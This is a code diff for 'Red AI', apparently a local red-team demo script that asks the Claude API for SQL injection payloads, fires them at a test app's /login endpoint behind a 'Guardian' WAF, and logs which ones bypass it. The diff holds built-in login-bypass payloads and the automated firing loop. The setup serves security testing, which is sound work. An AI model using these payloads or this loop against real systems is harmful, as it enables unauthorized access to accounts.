@@ -1,9 +1,9 @@
 """
 Red AI — Automated SQL Injection Attacker Agent (Stage 2)
 
-Uses the Nebius AI Studio API (OpenAI-compatible) to generate SQL injection
-payloads, fires them at the Stage 1 target app's /login endpoint, and logs
-every result to a local JSON file.
+Uses the Anthropic Claude API to generate varied SQL injection payloads,
+fires them at the Stage 1 target app's /login endpoint (directly or through
+the Guardian AI proxy), and logs every result to a local JSON file.
 
 Safety: hard-restricted to 127.0.0.1 / localhost targets only.
 """
@@ -19,7 +19,6 @@ from urllib.parse import urlparse
 
 import requests
 from dotenv import load_dotenv
-from openai import OpenAI
 
 # ---------------------------------------------------------------------------
 # Config
@@ -31,16 +30,26 @@ LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "attack_log.
 # Load .env from the project root (one level up from red-ai/)
 load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".env"))
 
+# Supported active Claude models
+DEFAULT_MODEL = os.environ.get("ANTHROPIC_MODEL", "claude-sonnet-4-6")
 
-def get_llm_client() -> OpenAI | None:
-    """Initialise the Nebius AI Studio client via the OpenAI-compatible SDK."""
-    api_key = os.environ.get("NEBIUS_API_KEY")
+
+def get_llm_client():
+    """Initialise the Anthropic Claude client."""
+    api_key = os.environ.get("ANTHROPIC_API_KEY")
     if not api_key:
-        print("NOTICE: NEBIUS_API_KEY not set in .env — using built-in attack payloads.")
         return None
-    return OpenAI(
-        base_url="https://api.studio.nebius.com/v1/",
+
+    import anthropic
+
+    workspace_id = os.environ.get("ANTHROPIC_WORKSPACE_ID")
+    default_headers = {}
+    if workspace_id:
+        default_headers["anthropic-workspace-id"] = workspace_id
+
+    return anthropic.Anthropic(
         api_key=api_key,
+        default_headers=default_headers or None,
     )
 
 
@@ -76,8 +85,11 @@ Return ONLY a JSON array of these objects — no explanation, no markdown fences
 """
 
 
-def generate_payloads(client: OpenAI | None, model: str) -> list[dict]:
-    """Ask the LLM for SQL injection payloads and parse the JSON response."""
+def generate_payloads(client, model: str) -> tuple[list[dict], str]:
+    """
+    Ask Claude for SQL injection payloads and parse the JSON response.
+    Returns (payloads, source_description).
+    """
     fallback = [
         {"username": "' OR '1'='1' --", "password": "x"},
         {"username": "admin' --", "password": "x"},
@@ -90,34 +102,50 @@ def generate_payloads(client: OpenAI | None, model: str) -> list[dict]:
     ]
 
     if client is None:
-        return fallback
+        print("[Red AI] ⚠️  WARNING: Using fallback payloads — Claude call failed or unauthenticated (ANTHROPIC_API_KEY missing)")
+        return fallback, "built-in fallback (unauthenticated)"
 
-    try:
-        resp = client.chat.completions.create(
-            model=model,
-            temperature=0.7,
-            messages=[
-                {"role": "system", "content": SQLI_SYSTEM_PROMPT},
-                {"role": "user", "content": "Generate the payloads now."},
-            ],
-        )
-        raw = resp.choices[0].message.content.strip()
+    # Candidate active models in order of priority
+    candidate_models = [model]
+    if "claude-sonnet-4-6" not in candidate_models:
+        candidate_models.append("claude-sonnet-4-6")
+    if "claude-haiku-4-5" not in candidate_models:
+        candidate_models.append("claude-haiku-4-5")
 
-        # Strip markdown fences if the model wraps the output
-        raw = re.sub(r"^```(?:json)?\s*", "", raw)
-        raw = re.sub(r"\s*```$", "", raw)
+    last_error = None
+    for cand_model in candidate_models:
+        try:
+            print(f"[Red AI] Requesting payloads from Claude ({cand_model})...")
+            response = client.messages.create(
+                model=cand_model,
+                max_tokens=1024,
+                system=SQLI_SYSTEM_PROMPT,
+                messages=[
+                    {"role": "user", "content": "Generate the payloads now."},
+                ],
+            )
+            raw = response.content[0].text.strip()
 
-        payloads = json.loads(raw)
-        if not isinstance(payloads, list):
-            payloads = [payloads]
-        return payloads
+            # Strip markdown fences if the model wraps the output
+            raw = re.sub(r"^```(?:json)?\s*", "", raw)
+            raw = re.sub(r"\s*```$", "", raw)
 
-    except json.JSONDecodeError:
-        print("WARNING: LLM returned non-JSON — using fallback payloads.")
-        return fallback
-    except Exception as e:
-        print(f"WARNING: LLM call failed ({e}) — using fallback payloads.")
-        return fallback
+            payloads = json.loads(raw)
+            if not isinstance(payloads, list):
+                payloads = [payloads]
+
+            print(f"[Red AI] ✅ Using Claude-generated payloads ({cand_model})")
+            return payloads, f"Claude ({cand_model})"
+
+        except json.JSONDecodeError as e:
+            last_error = f"Non-JSON response from {cand_model}: {e}"
+            break
+        except Exception as e:
+            last_error = f"{cand_model} failed: {e}"
+            continue
+
+    print(f"[Red AI] ⚠️  WARNING: Using fallback payloads — Claude call failed or unauthenticated ({last_error})")
+    return fallback, f"built-in fallback (error: {last_error})"
 
 
 # ---------------------------------------------------------------------------
@@ -126,7 +154,7 @@ def generate_payloads(client: OpenAI | None, model: str) -> list[dict]:
 SUCCESS_MARKERS = ["Welcome", "Role:"]
 
 
-def fire_payload(target_url: str, payload: dict) -> dict:
+def fire_payload(target_url: str, payload: dict, source: str) -> dict:
     """Send a single payload to the login endpoint and classify the result."""
     login_url = f"{target_url.rstrip('/')}/login"
     ts = datetime.now(timezone.utc).isoformat()
@@ -138,6 +166,7 @@ def fire_payload(target_url: str, payload: dict) -> dict:
         return {
             "timestamp": ts,
             "payload": payload,
+            "source": source,
             "status_code": resp.status_code,
             "success": success,
             "response_snippet": body,
@@ -146,6 +175,7 @@ def fire_payload(target_url: str, payload: dict) -> dict:
         return {
             "timestamp": ts,
             "payload": payload,
+            "source": source,
             "status_code": None,
             "success": False,
             "response_snippet": str(e),
@@ -184,8 +214,8 @@ def main():
     )
     parser.add_argument(
         "--model",
-        default="nvidia/nemotron-3-super",
-        help="Nebius model ID to use for payload generation",
+        default=DEFAULT_MODEL,
+        help=f"Claude model ID to use for payload generation (default: {DEFAULT_MODEL})",
     )
     args = parser.parse_args()
 
@@ -200,17 +230,17 @@ def main():
     print(f"  Model  : {args.model}")
     print("=" * 60)
 
-    # 1. Generate payloads via LLM
-    print("\n[1/3] Generating payloads via Nebius AI Studio...")
+    # 1. Generate payloads via LLM or fallback
+    print("\n[1/3] Preparing attack payloads...")
     client = get_llm_client()
-    payloads = generate_payloads(client, args.model)
-    print(f"      → {len(payloads)} payloads generated.\n")
+    payloads, source = generate_payloads(client, args.model)
+    print(f"      → {len(payloads)} payloads ready to fire.\n")
 
     # 2. Fire each payload
     print("[2/3] Firing payloads at target...\n")
     results = []
     for i, payload in enumerate(payloads, 1):
-        result = fire_payload(args.target, payload)
+        result = fire_payload(args.target, payload, source)
         if result["success"]:
             status = "✅ SUCCESS (Bypassed)"
         elif result.get("status_code") == 403:
@@ -233,6 +263,7 @@ def main():
     print("\n" + "=" * 60)
     print("  SUMMARY")
     print("=" * 60)
+    print(f"  Payload source   : {source}")
     print(f"  Payloads tried   : {total}")
     print(f"  Payloads SUCCESS : {len(wins)} (Bypassed WAF to app)")
     print(f"  Payloads BLOCKED : {len(blocked)} (Intercepted by Guardian WAF)")
